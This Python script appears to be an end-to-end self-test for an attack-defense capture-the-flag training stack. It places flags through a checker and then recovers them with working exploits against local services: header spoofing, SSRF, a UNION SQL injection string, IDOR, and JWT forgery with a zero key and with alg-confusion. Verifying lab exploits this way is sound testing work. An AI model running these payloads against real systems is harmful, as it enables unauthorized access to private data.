#!/usr/bin/env python3
"""End-to-end self-test: prove the checker plants each flag where the writeup
exploit actually reads it.

For every slot the tool runs ``checker.py put`` to place a fresh flag, then
pulls that flag back using the *attacker* path from the write-ups (SSRF, XFF,
SQLi, IDOR, JWT forgery, log grep, ...) relying only on the public
``attack_data``. A slot passes only if the exploit returns the exact flag.

Stdlib only. Default URLs match the local training stack; override any service
with e.g. ``--blackline-url http://127.0.0.1:8085`` when ports are remapped.
"""

import argparse
import base64
import hashlib
import hmac
import http.cookiejar
import json
import os
import secrets
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
CHECKER = os.path.join(HERE, "checker.py")

DEFAULT_URLS = {
    "news": "http://127.0.0.1:3000",
    "smp": "http://127.0.0.1:7000",
    "web": "http://127.0.0.1:5001",
    "blackline": "http://127.0.0.1:8080",
}
# Port the SSRF target (DNK_news) listens on *inside* its container.
NEWS_INTERNAL = "http://127.0.0.1:3000"

SLOTS = {
    "news": ("report", "private_news"),
    "smp": ("message", "pigeon"),
    "web": ("operation", "route"),
    "blackline": ("profile", "fleet", "finance", "audit", "retail"),
}


class ExploitError(Exception):
    pass


# --------------------------------------------------------------------------- #
# tiny HTTP helper
# --------------------------------------------------------------------------- #
def do_http(method, url, data=None, form=False, headers=None, jar=None, timeout=8):
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar) if jar is not None
        else urllib.request.HTTPHandler()
    )
    body = None
    hdrs = dict(headers or {})
    if data is not None:
        if form:
            body = urllib.parse.urlencode(data).encode()
            hdrs.setdefault("Content-Type", "application/x-www-form-urlencoded")
        else:
            body = json.dumps(data).encode()
            hdrs.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        raise ExploitError(f"connection failed: {exc}") from exc


def hget(*a, **k):
    return do_http("GET", *a, **k)


# --------------------------------------------------------------------------- #
# JWT forgery (stdlib HS256) — used for the SMP zero-key and the DNK_blackLine
# alg-confusion write-ups.
# --------------------------------------------------------------------------- #
def _b64u(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=")


def forge_hs256(payload, key, header=None):
    hdr = header or {"alg": "HS256", "typ": "JWT"}
    seg = _b64u(json.dumps(hdr, separators=(",", ":")).encode()) + b"." + \
        _b64u(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(key, seg, hashlib.sha256).digest()
    return (seg + b"." + _b64u(sig)).decode()


def rand_user(prefix):
    return f"{prefix}_{secrets.token_hex(5)}", secrets.token_urlsafe(16)


# --------------------------------------------------------------------------- #
# checker put
# --------------------------------------------------------------------------- #
def checker_put(service, slot, flag, url):
    out = subprocess.run(
        [sys.executable, CHECKER, "put", service, "--slot", slot,
         "--flag", flag, "--url", url],
        capture_output=True, text=True,
    )
    try:
        res = json.loads(out.stdout.strip().splitlines()[-1])
    except (ValueError, IndexError):
        raise ExploitError(f"checker put produced no JSON: {out.stdout}{out.stderr}")
    if res.get("status") != "ok":
        raise ExploitError(f"checker put failed: {res.get('error', res)}")
    return res.get("state", {}), res.get("attack_data", {})


# --------------------------------------------------------------------------- #
# per-slot exploits (attacker view — use attack_data only)
# --------------------------------------------------------------------------- #
def ex_news_report(base, ad, flag):
    # VULN: X-Forwarded-For spoof on GET /api/reports/<id> exposes confidential_data.
    jar = http.cookiejar.CookieJar()
    user, pw = rand_user("atk")
    do_http("POST", base + "/register",
         {"username": user, "password": pw, "email": user + "@evil.invalid"},
         form=True, jar=jar)
    do_http("POST", base + "/login", {"username": user, "password": pw}, form=True, jar=jar)
    _, body = hget(base + f"/api/reports/{ad['id']}",
                   headers={"X-Forwarded-For": "127.0.0.1"}, jar=jar)
    return json.loads(body).get("confidential_data") == flag


def ex_news_private(base, ad, flag):
    # VULN: unauthenticated SSRF on /admin/health-check reaches the internal API.
    target = NEWS_INTERNAL + f"/api/news/{ad['id']}"
    _, body = hget(base + "/admin/health-check?" +
                   urllib.parse.urlencode({"url": target}))
    return flag in body


def ex_web_operation(base, ad, flag):
    # VULN: SQL injection in GET /api/operations (source_destination).
    user, pw = rand_user("atk")
    do_http("POST", base + "/api/auth/register",
         {"username": user, "password": pw, "role": "operator", "full_name": "atk"})
    _, body = do_http("POST", base + "/api/auth/login", {"username": user, "password": pw})
    token = json.loads(body)["token"]
    inj = ("' UNION SELECT id,operation_type,depot_id,tank_id,fuel_type,volume,"
           "timestamp,source_destination,transport_type,operator_id,notes,"
           "document_reference,NULL FROM operations -- ")
    _, body = hget(base + "/api/operations?" +
                   urllib.parse.urlencode({"source_destination": inj}),
                   headers={"Authorization": "Bearer " + token})
    rows = json.loads(body)
    return any(isinstance(r, dict) and r.get("notes") == flag for r in rows)


def ex_web_route(base, ad, flag):
    # VULN: IDOR on GET /api/routes/<id>/gps leaks notes of any route.
    user, pw = rand_user("atk")
    do_http("POST", base + "/api/auth/register",
         {"username": user, "password": pw, "role": "operator", "full_name": "atk"})
    _, body = do_http("POST", base + "/api/auth/login", {"username": user, "password": pw})
    token = json.loads(body)["token"]
    _, body = hget(base + f"/api/routes/{ad['route_id']}/gps",
                   headers={"Authorization": "Bearer " + token})
    return json.loads(body).get("notes") == flag


def ex_smp_message(base, ad, flag):
    # VULN: unauthenticated GET /api/messages?message_id=% (LIKE wildcard) dumps all.
    _, body = hget(base + "/api/messages?" + urllib.parse.urlencode({"message_id": "%"}))
    return any(m.get("content") == flag for m in json.loads(body))


def ex_smp_pigeon(base, ad, flag):
    # VULN: JWT signed with the all-zero key -> impersonate any username.
    for username in ad["usernames"]:
        token = forge_hs256({"sub": username, "exp": 9999999999}, b"\x00" * 32)
        status, body = hget(base + "/api/pigeons",
                            headers={"Authorization": "Bearer " + token})
        if status != 200:
            continue
        pigeons = json.loads(body)
        if isinstance(pigeons, dict):
            pigeons = pigeons.get("pigeons", [])
        if any(p.get("description") == flag for p in pigeons):
            return True
    return False


def ex_bl_profile(base, ad, flag):
    # VULN: alg-confusion — HMAC-sign with the public key served at /keys/public.
    _, pub = hget(base + "/api/auth/keys/public")
    token = forge_hs256({"sub": ad["user_id"], "email": "x", "role": "admin"},
                        pub.encode())
    _, body = hget(base + "/api/profile/secrets",
                   headers={"Authorization": "Bearer " + token})
    return json.loads(body).get("profile_flag") == flag


def _bl_token(base):
    """A throwaway valid blackline token (IDOR endpoints ignore ownership)."""
    email = f"atk_{secrets.token_hex(5)}@evil.invalid"
    pw = secrets.token_urlsafe(16)
    do_http("POST", base + "/api/auth/register",
         {"email": email, "password": pw, "name": "atk", "role": "operator"})
    _, body = do_http("POST", base + "/api/auth/login", {"email": email, "password": pw})
    return json.loads(body)["jwt"]


def ex_bl_fleet(base, ad, flag):
    # VULN: IDOR on GET /api/fleet/webhooks/<id> returns secret_token.
    token = _bl_token(base)
    _, body = hget(base + f"/api/fleet/webhooks/{ad['webhook_id']}",
                   headers={"Authorization": "Bearer " + token})
    return json.loads(body).get("secret_token") == flag


def ex_bl_finance(base, ad, flag):
    # VULN: orderBy backdoor echoes role_fin_flag of any user id.
    token = _bl_token(base)
    order = f"SELECT ROLE_FIN_FLAG FROM CONFIGS WHERE USER_ID={ad['user_id']}"
    _, body = do_http("POST", base + "/api/fin/reports/preview", {"orderBy": order},
                   headers={"Authorization": "Bearer " + token})
    return flag in body


def ex_bl_audit(base, ad, flag):
    # VULN: log_flag written to world-readable logs, grepped via /api/logs.
    _, body = hget(base + "/api/logs?" + urllib.parse.urlencode({"q": flag}))
    return flag in body


def ex_bl_retail(base, ad, flag):
    # VULN: unauthenticated /api/retail/tanks/<id>/summary leaks role_retail_flag.
    _, body = hget(base + f"/api/retail/tanks/{ad['tank_id']}/summary")
    cfg = json.loads(body).get("owner_configs") or {}
    return cfg.get("role_retail_flag") == flag


EXPLOITS = {
    ("news", "report"): ex_news_report,
    ("news", "private_news"): ex_news_private,
    ("web", "operation"): ex_web_operation,
    ("web", "route"): ex_web_route,
    ("smp", "message"): ex_smp_message,
    ("smp", "pigeon"): ex_smp_pigeon,
    ("blackline", "profile"): ex_bl_profile,
    ("blackline", "fleet"): ex_bl_fleet,
    ("blackline", "finance"): ex_bl_finance,
    ("blackline", "audit"): ex_bl_audit,
    ("blackline", "retail"): ex_bl_retail,
}


FLAG_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"


def forcad_flag():
    """Same format the jury plants: [A-Z0-9]{31}=."""
    return "".join(secrets.choice(FLAG_ALPHABET) for _ in range(31)) + "="


def run_slot(service, slot, url):
    flag = forcad_flag()
    _, attack_data = checker_put(service, slot, flag, url)
    ok = EXPLOITS[(service, slot)](url, attack_data, flag)
    return ok, attack_data


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("services", nargs="*", default=list(SLOTS),
                    help="subset of: " + ", ".join(SLOTS))
    for name in DEFAULT_URLS:
        ap.add_argument(f"--{name}-url", default=DEFAULT_URLS[name])
    args = ap.parse_args()
    urls = {n: getattr(args, f"{n}_url") for n in DEFAULT_URLS}
    services = args.services or list(SLOTS)

    rows, failures = [], 0
    for service in services:
        for slot in SLOTS[service]:
            try:
                ok, ad = run_slot(service, slot, urls[service])
                status = "PASS" if ok else "FAIL"
                detail = "" if ok else "exploit did not recover the flag"
            except Exception as exc:  # noqa: BLE001 - report any slot failure
                ok, status, detail, ad = False, "FAIL", f"{type(exc).__name__}: {exc}", {}
            if not ok:
                failures += 1
            rows.append((f"{service}/{slot}", status, json.dumps(ad, ensure_ascii=False), detail))

    width = max(len(r[0]) for r in rows)
    print(f"{'slot'.ljust(width)}  result  attack_data / note")
    print("-" * (width + 40))
    for name, status, ad, detail in rows:
        tail = ad if status == "PASS" else (detail or ad)
        print(f"{name.ljust(width)}  {status:4}    {tail}")
    print(f"\n{len(rows) - failures}/{len(rows)} slots verified via the write-up exploit")
    return 1 if failures else 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
